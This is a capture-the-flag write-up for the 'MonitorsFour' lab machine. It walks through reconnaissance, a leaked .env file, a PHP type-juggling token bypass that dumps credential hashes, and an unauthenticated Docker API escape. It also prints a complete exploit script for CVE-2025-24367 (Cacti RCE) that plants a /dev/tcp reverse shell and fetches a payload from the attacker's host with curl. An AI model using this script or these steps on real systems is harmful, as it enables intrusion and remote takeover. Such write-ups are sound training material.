## **1. Reconnaissance**

### **Network Scanning (Nmap)**
The initial step involved a standard Nmap scan to identify open ports and services.
- **Command:** `sudo nmap -sC -sV 10.10.11.98`
- **Findings:**
    - **Port 80 (HTTP):** Open, running **Nginx**.
    - **Title:** `MonitorsFour - Networking Solutions`.
    - **Technologies:** PHP 8.3.27 (identified via headers).
### **Subdomain Enumeration**
Since the web server is Nginx (commonly used as a reverse proxy), there was a high probability of virtual hosting.
- **Command:** `ffuf -u http://monitorsfour.htb ... -w ...subdomains-top1million-110000.txt`%%  %%
- **Refinement:** The initial scan produced false positives with a size of 138. Re-running with `-fs 138` (Filter Size) successfully isolated a valid subdomain.
- **Discovery:** `cacti.monitorsfour.htb` (Status 302).
- **Action:** Added `cacti.monitorsfour.htb` to `/etc/hosts`.

---

## **2. Web Enumeration & Information Disclosure**

While investigating the main website (`monitorsfour.htb`), several critical files and endpoints were discovered.
### **The `.env` Leak**
A check for standard configuration files revealed a `.env` file publicly accessible.
- **Command:** `curl http://monitorsfour.htb/.env`
- **Leak:** This exposed database credentials:
    - **User:** `monitorsdbuser`
    - **Pass:** `f37p2j8f4t0r`
    - **DB:** `monitorsfour_db`
### **API Fuzzing**

Scanning for API endpoints provided the critical entry point.
- **Command:** `ffuf ... -w common-api-endpoints-mazen160.txt ...`
- **Findings:**
    - `/login` (Status 200)
    - `/user` (Status 200) - **Critical**

---
## **3. Vulnerability Analysis: PHP Type Juggling**

The `/user` endpoint appeared to require a `token`. By inspecting the behavior of the application, we identified a classic **PHP Type Juggling** vulnerability.
### **The "Magic" Token Exploit**
- **The Vulnerability:** PHP's loose comparison operator (`==`) treats strings starting with `"0e"` followed by numbers as **scientific notation for zero**.
    - Example: `"0e5432..."` is interpreted as $0 \times 10^{5432} = 0$.
- **The Exploit:** Setting `token=0` forces PHP to compare the input integer `0` against the database tokens. If any token starts with `0e`, the condition `0 == "0e..."` evaluates to **True**.
- **Execution:**
```bash
    curl "http://monitorsfour.htb/user?token=0"
    ```

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```
- **Result:** The server dumped the database, revealing the Administrator credentials:
    - **User:** `admin` (Marcus Higgins)
    - **Password Hash:** `56b32eb43e6f15395f6c46c1c9e1cd36` (MD5)
_Cracking the MD5 hash revealed the password:_ **`wonderful1`**
---
## **4. Exploitation: Cacti Authenticated RCE**
With the credentials (`marcus` : `wonderful1`), we targeted the **Cacti** instance found on the subdomain.
- **Target:** `http://cacti.monitorsfour.htb`
- **Vulnerability:** **CVE-2025-24367** (Authenticated Remote Code Execution via Graph Templates).
- **Exploit Script:** Used `cacti_exp.py`, a python script that automates the injection of a malicious payload into the Graph Template settings.
	```python
cat cacti_exp.py
###########################################################
#                                                         #
# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #
#         Created by TheCyberGeek @ HackTheBox            #
#             For educational purposes only               #    
#                                                         #
###########################################################

import argparse
import requests
import sys
import re
import time
import random
import string
import http.server
import os
import socketserver
import threading
from pathlib import Path
from urllib.parse import quote_plus
from bs4 import BeautifulSoup

SESSION = requests.Session()

"""
Custom HTTP logging class
"""
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        if args[1] == '200':
            print(f"[+] Got payload: {self.path}")
        else:
            pass

"""
Web server class with start and stop functionalities in working directory
"""
class BackgroundHTTPServer:
    def __init__(self, directory, port=80):
        self.directory = directory
        self.port = port
        self.httpd = None
        self.server_thread = None

    def start(self):
        os.chdir(self.directory)
        handler = CustomHTTPRequestHandler
        self.httpd = socketserver.TCPServer(("", self.port), handler)
        self.server_thread = threading.Thread(target=self.httpd.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        print(f"[+] Serving HTTP on port {self.port}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.server_thread.join()
            print(f"[+] Stopped HTTP server on port {self.port}")

"""
Check if instance is Cacti
"""
def check_cacti(url: str) -> None:
    req = requests.get(url)
    if "Cacti" in req.text:
        print("[+] Cacti Instance Found!")
    else:
        print("[!] No Cacti Instance was found, exiting...")
        exit(1)
    
"""
Log into the Cacti instance
"""
def login(url: str, username: str, password: str, ip: str, port: int, proxy: dict | None) -> None:
    res = SESSION.get(url, proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', res.text)
    csrf_magic_token = match.group(1)
    data = {
        '__csrf_magic': csrf_magic_token,
        'action': 'login',
        'login_username': username,
        'login_password': password
    }
    req = SESSION.post(url + '/cacti/index.php', data=data, proxies=proxy)
    if 'You are now logged into' in req.text:
        print('[+] Login Successful!')
        return True
    else:
        print('[!] Login Failed :(')
        http_server.stop()
        exit(1)

"""
Write bash payload
"""
def write_payload(ip: str, port: int) -> None:
    with open("bash", "w") as f:
        f.write(f"#!/bin/bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1")
        f.close()

"""
Get the template ID required for exploitation (Unix - Logged In Users)
"""
def get_template_id(url: str, proxy: dict | None) -> int:
    graph_template_search = SESSION.get(url + '/cacti/graph_templates.php?filter=Unix - Logged in Users&rows=-1&has_graphs=false', proxies=proxy)
    soup = BeautifulSoup(graph_template_search.text, "html.parser")
    elem = soup.find("input", id=re.compile(r"chk_\d+"))

    if elem:
        template_id = int(elem["id"].split("_")[1])
        print(f"[+] Got graph ID: {template_id}")
    else:
        print("[!] Failed to get template ID")
        http_server.stop()
        exit(1)

    return template_id

"""
Trigger the payload in multiple requests
"""
def trigger_payload(url: str, ip: str, stage: str, template_id: int, proxy: dict | None) -> None:    
    # Edit graph template
    graph_template_page = SESSION.get(url + f'/cacti/graph_templates.php?action=template_edit&id={template_id}', proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', graph_template_page.text)
    csrf_magic_token = match.group(1)

    # Generate random filename
    get_payload_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"
    trigger_payload_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + ".php"

    # Change payload based on stage
    if stage == "write payload":
        print(f"[i] Created PHP filename: {get_payload_filename}")
        right_axis_label = (
            f"XXX\n"
            f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
            f"RRA:AVERAGE:0.5:1:1200\n"
            f"graph {get_payload_filename} -s now -a CSV "
            f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\\x20{ip}/bash\\x20-o\\x20bash`;?>\n"
        )
    else:
        print(f"[i] Created PHP filename: {trigger_payload_filename}")
        right_axis_label = (
            f"XXX\n"
            f"create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 "
            f"RRA:AVERAGE:0.5:1:1200\n"
            f"graph {trigger_payload_filename} -s now -a CSV "
            f"DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`bash\\x20bash`;?>\n"
        )        

    data = {
        "__csrf_magic": csrf_magic_token,
        "name": "Unix - Logged in Users",
        "graph_template_id": template_id,
        "graph_template_graph_id": template_id,
        "save_component_template": "1",
        "title": "|host_description| - Logged in Users",
        "vertical_label": "percent",
        "image_format_id": "3",
        "height": "200",
        "width": "700",
        "base_value": "1000",
        "slope_mode": "on",
        "auto_scale": "on",
        "auto_scale_opts": "2",
        "auto_scale_rigid": "on",
        "upper_limit": "100",
        "lower_limit": "0",
        "unit_value": "",
        "unit_exponent_value": "",
        "unit_length": "",
        "right_axis": "",
        "right_axis_label": right_axis_label,
        "right_axis_format": "0",
        "right_axis_formatter": "0",
        "left_axis_formatter": "0",
        "auto_padding": "on",
        "tab_width": "30",
        "legend_position": "0",
        "legend_direction": "0",
        "rrdtool_version": "1.7.2",
        "action": "save"
    }

    # Update the template
    get_file = SESSION.post(url + '/cacti/graph_templates.php?header=false', data=data, allow_redirects=True, proxies=proxy)

    # Trigger execution
    trigger_write = SESSION.get(url + f'/cacti/graph_json.php?rra_id=0&local_graph_id=3&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700')

    # Get payloads
    try:
        if stage == "write payload":
            res = SESSION.get(url + f'/cacti/{get_payload_filename}')
        else:
            res = SESSION.get(url + f'/cacti/{trigger_payload_filename}', timeout=2)
    except requests.Timeout:
        print("[+] Hit timeout, looks good for shell, check your listener!")
        return

    if "File not found" in res.text:
        print("[!] Exploit failed to execute!")
        http_server.stop()
        exit(1)      

"""
Main function to parse args and trigger execution
"""
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='CVE-2025-24367 - Cacti Authenticated Graph Template RCE')
    parser.add_argument('-u', '--user', type=str, required=True, help='Username for login')
    parser.add_argument('-p', '--password', type=str, required=True, help='Password for login')
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP address for reverse shell')
    parser.add_argument('-l', '--port', type=str, required=True, help='Port number for reverse shell')
    parser.add_argument('-url', '--url', type=str, required=True, help='Base URL of the application')
    parser.add_argument('--proxy', action='store_true', help='Enable proxy usage (default: http://127.0.0.1:8080)')
    args = parser.parse_args()
    proxy = {'http': 'http://127.0.0.1:8080'} if args.proxy else None
    check_cacti(args.url)
    http_server = BackgroundHTTPServer(os.getcwd(), 80)
    http_server.start()  
    login(args.url, args.user, args.password, args.ip, args.port, proxy)
    template_id = get_template_id(args.url, proxy)
    write_payload(args.ip, args.port)
    trigger_payload(args.url, args.ip, "write payload", template_id, proxy)
    trigger_payload(args.url, args.ip, "trigger payload", template_id, proxy)
    http_server.stop()
    Path("bash").unlink(missing_ok=True)

	```
### **Exploit Execution**
The script required `sudo` privileges because it spawns a local HTTP server on port 80 to deliver the payload.
```bash
sudo python3 cacti_exp.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.14.122 -l 4444
```

**Breakdown of the Exploit Log:**
1. **Login:** Validated credentials (`[+] Login Successful!`).
2. **Template ID:** Identified a valid graph template ID to infect (`[+] Got graph ID: ...`).
3. **Payload Delivery:** The script overwrote the `right_axis_label` in the graph settings with a command execution payload (likely using `php -r` or `bash`).
4. **Trigger:** The script forced Cacti to render the graph, executing the injected bash command.
### **Gaining the Foothold**

The payload successfully connected back to the listener (Penelope).
```
[+] Got reverse shell from 821fbd6a43fa~10.10.11.98-Linux-x86_64
(Penelope)> interact 1
```

Once inside the shell, navigating to the user's home directory revealed the **User Flag**.

---

### **Summary of the Kill Chain**
1. **Found Subdomain:** `cacti.monitorsfour.htb`.
2. **Found API:** `/user` endpoint.
3. **Bypassed Auth:** Used `token=0` (PHP Type Juggling) to dump creds.
4. **Cracked Pass:** `admin` -> `wonderful1`.
5. **Exploited Cacti:** Used Authenticated RCE to get a shell.


# Root Flag:

### 1. Enumeration of Internal Docker API

We identified that the internal gateway IP `192.168.65.7` had port `2375` (Docker Engine API) open. We used `curl` to list the available images on the host to find a valid image to use for the exploit.

**Command:**

Bash

```
curl http://192.168.65.7:2375/images/json
```

Result:

The output confirmed the existence of alpine:latest (Image ID sha256:4b7ce...), which we selected for the attack.

### 2. Crafting the Malicious Container

We constructed a JSON payload to create a new container named `rootgrab`. The payload had two critical components:

- **Cmd:** A command to `cat` the flag located at `/mnt/pwn/mnt/host/c/Users/Administrator/Desktop/root.txt`.
- **HostConfig (Binds):** A configuration to mount the host's root filesystem (`/`) to `/mnt/pwn` inside the container.

**Command:**

Bash

```
curl -X POST -H "Content-Type: application/json" \
-d '{
   "Image": "alpine:latest",
   "Cmd": ["cat", "/mnt/pwn/mnt/host/c/Users/Administrator/Desktop/root.txt"],
   "HostConfig": {
     "Binds": ["/:/mnt/pwn"]
   }
}' \
"http://192.168.65.7:2375/containers/create?name=rootgrab"
```

Result:

The API returned a success message with the new Container ID: {"Id":"eb9fc0142618...","Warnings":[]}.

### 3. Execution (Starting the Container)

We instructed the Docker API to start the `rootgrab` container, which triggered the `cat` command we defined in the previous step.

**Command:**

Bash

```
curl -X POST "http://192.168.65.7:2375/containers/rootgrab/start"
```

### 4. Retrieving the Flag

We retrieved the standard output (logs) of the container to read the flag. We added `--output -` because `curl` initially blocked the binary output.

**Command:**

Bash

```
curl "http://192.168.65.7:2375/containers/rootgrab/logs?stdout=1" --output -
```

Result:

The command output the contents of root.txt, completing the exploit.